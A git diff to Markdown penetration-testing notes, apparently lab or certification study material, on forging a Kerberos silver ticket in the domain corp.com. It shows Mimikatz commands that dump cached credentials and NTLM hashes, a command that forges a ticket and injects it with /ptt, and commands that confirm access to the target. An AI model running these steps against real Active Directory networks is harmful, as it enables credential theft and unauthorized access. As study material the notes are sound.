@@ -44,10 +44,10 @@ Confirm user has no access to the resource:&#x20;
 iwr -UseDefaultCredentials http://web04
 ```
 
-Extract cached AD credentials with Mimikatz:
+### Extract cached AD credentials with Mimikatz:
 
 {% code title="Mimikatz" %}
-```
+```powershell
 privilege::debug
 
 sekurlsa::logonpasswords
@@ -56,17 +56,15 @@ sekurlsa::logonpasswords
 
 * looking for NLTM hashes
 
-Get SID:
+### Get SID:
 
-```
+```powershell
 whoami /user
 ```
 
-* we're only interested in the Domain SID, so we omit the RID of the user
+* we're only interested in the <mark style="color:green;">Domain SID</mark>, so we omit the <mark style="color:red;">RID</mark> of the user (e.g <mark style="color:green;">S-1-5-21-1987370270-658905905-1781884369</mark><mark style="color:red;">-1105</mark>)
 
-
-
-
+### Create the forged service ticket
 
 {% code title="Mimikatz" overflow="wrap" %}
 ```powershell
@@ -83,11 +81,15 @@ kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com 
 * **/ptt:** allows us to inject the forged ticket into the memory of the machine we execute the command on
 * **/user:** an existing domain user
 
-
+List Kerberos tickets to confirm the silver ticket is submitted to the current session:
 
 ```
 klist
 ```
 
+Attempt to access the resource:
 
+```powershell
+iwr -UseDefaultCredentials http://web04
+```
 
